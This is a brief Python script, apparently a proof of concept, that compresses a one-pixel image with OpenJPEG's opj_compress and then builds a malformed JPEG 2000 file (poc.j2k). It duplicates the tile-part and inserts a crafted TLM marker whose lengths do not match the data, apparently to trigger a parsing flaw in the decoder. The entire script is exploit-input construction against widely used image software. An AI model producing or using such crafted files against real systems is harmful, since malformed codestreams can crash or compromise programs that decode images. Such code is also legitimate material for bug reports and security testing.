from pathlib import Path
import struct, os
Path('/tmp/tiny.pgm').write_bytes(b'P5\n1 1\n255\n\0')
os.system('./build/bin/opj_compress -i /tmp/tiny.pgm -o /tmp/tiny.j2k -n 1 -r 1 -t 1,1 -I >/tmp/log 2>&1')
b=Path('/tmp/tiny.j2k').read_bytes(); sot=b.find(b'\xff\x90'); eoc=b.rfind(b'\xff\xd9'); main=b[:sot]; tp=b[sot:eoc]
def make_tp(tpno):
 x=bytearray(tp); x[10]=tpno; x[11]=0; x[6:10]=struct.pack('>I', len(x)); return bytes(x)
tp0=make_tp(0); tp1=make_tp(1)
tlm=b'\xff\x55'+struct.pack('>HBBI',8,0,0x40,len(tp0))
poc=main+tlm+tp0+tp1+b'\xff\xd9'; Path('/tmp/poc.j2k').write_bytes(poc)
print(len(poc), tlm.hex())
